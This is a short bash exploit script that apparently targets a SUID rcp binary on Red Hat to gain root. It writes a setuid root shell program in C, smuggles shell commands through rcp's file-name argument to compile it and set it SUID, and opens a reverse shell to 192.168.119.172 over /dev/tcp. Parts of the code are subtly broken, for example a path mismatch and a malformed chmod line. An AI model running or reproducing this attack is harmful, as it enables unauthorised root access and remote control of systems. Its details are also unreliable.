#!/bin/bash

# According to exploitdb this method does not work in all situations and has only been tested on a version of Red Hat

RCPFILE="/usr/bin/rcp" ;
TEST=$(ls -ld $RCPFILE)
SUIDBIT=$(echo ${TEST:3:1})

if [ $SUIDBIT != "s" ]; then
	printf "rcp is not suid, quiting\n" ;
	exit;
else
	touch /tmp/shell.c || printf "There was an issue creating shell.c in tmp directory\n"
	printf "#include<unistd.h>\n#include<stdlib.h>\nint main()\n{" > shell.c
	printf "    setuid(0);\n\tsetgid(0);\n\texecl(\"/bin/sh\",\"sh\",0);\n\treturn 0;\n}\n" >> shell.c
	
	touch caterpillar
# Add you user to the sudo group if you have a password
#	/usr/bin/rcp 'vaterpillar butterfly; chmod -aG wheel username;' 127.0.0.1 2> /dev/null

# Create a shell.c binary and run it with the SUID bit set on it
	/usr/bin/rcp 'caterpillar butterfly; gcc -o /tmp/shell /tmp/shell.c;' 127.0.0.1 2> /dev/null
	/usr/bin/rcp 'caterpillar butterfly; chmod u+s /tmp/shell;' 127.0.0.1 2> /dev/null
	/usr/bin/rcp 'caterpillar butterfly; bash -i >& /dev/tcp/192.168.119.172/443 0>&1 && whoami' 127.0.0.1 2> /dev/null
	printf "Launch /tmp/shell\n" ;

	/tmp/shell
fi
